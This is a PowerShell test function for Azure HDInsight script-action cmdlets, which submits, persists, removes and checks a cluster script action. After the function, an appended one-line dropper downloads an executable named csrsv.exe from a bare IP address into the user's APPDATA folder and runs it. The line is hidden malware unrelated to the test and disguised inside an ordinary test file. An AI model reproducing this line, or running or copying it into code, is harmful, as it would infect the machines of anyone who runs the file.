function Test-ScriptActionRelatedCommands{try{$cluster = Create-Cluster$scriptActionName = Generate-Name("scriptaction")$uri = "https://hdiconfigactions.blob.core.windows.net/linuxhueconfigactionv02/install-hue-uber-v02.sh"$nodeTypes = ("Worker")$script = Submit-AzHDInsightScriptAction -ClusterName $cluster.Name -Name $scriptActionName -Uri $uri -NodeTypes $nodeTypes$getScript = Get-AzHDInsightScriptActionHistory -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `| Where-Object {$_.Name -eq $script.Name }Assert-AreEqual $getScript.Name $script.NameSet-AzHDInsightPersistedScriptAction -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `-ScriptExecutionId $getScript.ScriptExecutionId$persistedScript = Get-AzHDInsightPersistedScriptAction -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `-Name $getScript.NameAssert-AreEqual $persistedScript.Name $getScript.NameRemove-AzHDInsightPersistedScriptAction -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `-Name $persistedScript.Name$persistedScript = Get-AzHDInsightPersistedScriptAction -ClusterName $cluster.Name -ResourceGroupName $cluster.ResourceGroup `-Name $getScript.NameAssert-Null $persistedScript}finally{Remove-AzHDInsightCluster -ClusterName $cluster.NameRemove-AzResourceGroup -ResourceGroupName $cluster.ResourceGroup}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")